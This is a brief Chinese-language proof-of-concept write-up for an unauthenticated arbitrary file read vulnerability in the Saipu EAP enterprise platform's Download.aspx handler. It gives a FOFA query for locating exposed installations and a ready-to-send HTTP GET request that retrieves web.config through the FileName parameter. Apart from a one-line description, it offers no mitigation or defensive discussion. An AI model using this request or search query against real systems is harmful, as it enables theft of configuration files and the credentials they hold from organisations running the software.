# 赛普EAP企业适配管理平台Download.aspx任意文件读取漏洞

赛普EAP企业适配管理平台 Download.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统文件，造成信息泄露。

## fofa

```kotlin
body="IDWebSoft/"
```

## poc

```javascript
GET /IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36
Content-Type:application/x-www-form-urlencoded
Accept: */*
Connection: Keep-Alive
```

![image-20241101195031794](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411011950858.png)